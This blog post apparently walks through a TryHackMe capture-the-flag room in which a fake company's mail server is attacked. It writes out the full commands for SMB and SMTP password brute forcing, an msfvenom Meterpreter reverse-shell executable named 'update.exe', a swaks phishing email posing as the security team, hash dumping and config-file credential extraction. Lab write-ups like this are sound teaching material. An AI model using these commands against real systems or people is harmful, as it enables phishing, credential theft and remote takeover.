---
title: You Got Mail - TryHackMe - Walkthrough
date: 2025-02-08 10:00:00 +0200
categories: [TryHackMe]
tags: [phishing,mail,hMailServer]
description: This room involves phishing users to gain a shell.
image:
  path: /assets/blog/You-Got-Mail/Room.png
  alt: You-Got-Mail Room image
---

## Description

This is the TryHackMe room **You Got Mail**, visit it there: <https://tryhackme.com/room/yougotmail>
> You are a penetration tester who has recently been requested to perform a security assessment for Brik. You are permitted to perform active assessments on `10.10.207.204` and strictly passive reconnaissance on [brownbrick.co](https://brownbrick.co/). The scope includes only the domain and IP provided and does not include other TLDs.
> 
> To begin, start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. Please allow 3-4 minutes for the VM to fully boot up.

**There are two ways you can solve this challenge**, one is the intensional phishing one and the other is the unintentionally, but very easy brute forcing one.

## Initial

I first started with an `nmap`.
```sh
sudo nmap -p- -sV -sC -oA nmap/initial -vv 10.10.58.45
```

The result shows us that we have a Windows server (I removed some unnecessary information).
```
PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          syn-ack ttl 127 hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 127 hMailServer imapd
|_imap-capabilities: IDLE NAMESPACE RIGHTS=texkA0001 completed CAPABILITY CHILDREN SORT IMAP4rev1 OK IMAP4 ACL QUOTA
445/tcp   open  microsoft-ds? syn-ack ttl 127
587/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-07T19:39:34+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we have the four ports `25,110,143,587` open which are the ports of the `hMailServer`, as you might know from the room description, we somehow need to send a mail and phish some user later.

Before I moved on with my enumeration, I checked out the page from the description. I usually look for any pages with non-template data to get usernames and possible passwords. The `/menu.html` page looks promising.

![](/assets/blog/You-Got-Mail/pub.png)

Here we have some usernames, with them I created three files:

```
oaurelius@brownbrick.co
wrohit@brownbrick.co
lhedvig@brownbrick.co
tchikondi@brownbrick.co
pcathrine@brownbrick.co
fstamatis@brownbrick.co
```
{: file='emails.txt'}
```
Omar Aurelius
Winifred Rohit
Laird Hedvig
Titus Chikondi
Pontos Cathrine
Filimena Stamatis
```
{: file='users.txt'}

I also created a "possible" username file with this command:
```sh
cat emails.txt | awk -F\@ '{ print $1 }'
```
This gave me this nice list:
```
oaurelius
wrohit
lhedvig
tchikondi
pcathrine
fstamatis
```
{: file='usernames.txt'}

## Way 1

The first way is the easy one and the one I had initially solved the challenge with. You can simply brute force the username list we have made against SMB with `nxc`. This is the quite risky way in a real environment, but at the time of doing this machine I just took the risk.

```sh
nxc smb 10.10.207.204 -u usernames.txt -p /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding
```

After about 5 minutes or so you should get a result.

![](/assets/blog/You-Got-Mail/pass.png)

To check if we have RDP as this user I used this command:
```terminal
$nxc rdp 10.10.207.204 -u "wrohit" -p "PASSWORD_YOU_FOUND"
RDP         10.10.207.204   3389   BRICK-MAIL       [*] Windows 10 or Windows Server 2016 Build 17763 (name:BRICK-MAIL) (domain:BRICK-MAIL) (nla:True)
RDP         10.10.207.204   3389   BRICK-MAIL       [+] BRICK-MAIL\wrohit:PASSWORD_YOU_FOUND (Pwn3d!)
```

We have access to RDP with that user, you can login to RDP with `Remmina` or any other tool and answer question 1 and 2. For question 3 go [here](#mail-server-leak).

## Way 2

This is the more difficult way. For this you first need to create a custom wordlist from the main page.
```sh
cewl --lowercase https://brownbrick.co/index.html > wordlist.txt
```

With that wordlist you now can try to brute force the SMTP server.

```sh
hydra -L emails.txt -P wordlist.txt -I -u smtp://10.10.207.204
```

This should take only a few seconds and you should get results.

![](/assets/blog/You-Got-Mail/pass2.png)

With this you now have access to a SMTP. Because this is a phishing room, my first idea was to send a executable to the emails we have already discovered. For that I used the Metasploit framework. I first generated a executable.

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.78.229 LPORT=4444 -f exe > update.exe
```

Now I needed to send a mail, for that I use `swaks`, which is a easy commandline tool for sending mails.

```sh
swaks \
  --to oaurelius@brownbrick.co \
  --server 10.10.207.204 \
  --from lhedvig@brownbrick.co \
  --attach update.exe \
  --body 'Patch your security with this executable!' \
  --port 25 \
  --header 'Subject: Important from Security Team' \
  --port 587 \
  --auth-user 'lhedvig@brownbrick.co' \
  --auth-password 'PASSWORD_YOU_FOUND'
```

Before sending the mail, you need to start a listener in Metasploit.
```sh
msfconsole
> use exploit/multi/handler
> set lhost tun0
> set payload windows/x64/meterpreter/reverse_tcp
> run
```

After around 1 minute you should get a connection back.

On the machine we are the user wrohit:

```terminal
(Meterpreter 3)(C:\Mail\Attachments) > getuid 
Server username: BRICK-MAIL\wrohit
```

I went to the users home and to the Desktop to recover the flag.

```terminal
(Meterpreter 3)(C:\Users\wrohit\Desktop) > ls
Listing: C:\Users\wrohit\Desktop
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2024-03-11 05:11:31 +0000  desktop.ini
100666/rw-rw-rw-  25    fil   2024-03-11 05:15:22 +0000  flag.txt
```

Next I checked my privileges and found out that I was a member of the `Local Administrators` group, so I have all necessary privileges for further exploitation.
```terminal
C:\Users\wrohit\Desktop>net user wrohit
net user wrohit
User name                    wrohit
Full Name                    wrohit
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/28/2024 3:34:28 PM
Password expires             Never
Password changeable          3/28/2024 3:34:28 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/8/2025 9:56:00 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```

In Metsaploit you can simply run `hashdump` to dump the hashes of the users, with that we can try solving question 2. I run `hashdump` and then copied the second hash of wrohit to [crackstation.net](https://crackstation.net/).


![](/assets/blog/You-Got-Mail/hashes.png)

![](/assets/blog/You-Got-Mail/crack.png)

As you might saw in the `nmap` scan we now can also connect to RDP with these credentials.

## Mail server leak

Now that we have administrative access on the machine with RDP, we can try to find the credentials for the hMailServer Administrator Dashboard, from a previous CTF I knew that the password of the Administrator user is stored inside the config file inside `C:\Program Files (x86)\hMailServer\Bin`.

![](/assets/blog/You-Got-Mail/loc.png)

You can open the config file in something like Notepad and extract the Administrator hash.

![](/assets/blog/You-Got-Mail/admin.png)

I also pasted this `md5` hash inside [crackstation.net](https://crackstation.net/) and got this:

![](/assets/blog/You-Got-Mail/final.png)

This was the room. After I got the password for wrohit with my SMB brute force I was quite confused why there was no phishing in this room, but eventually after some enumeration of the machine I found the intended way.
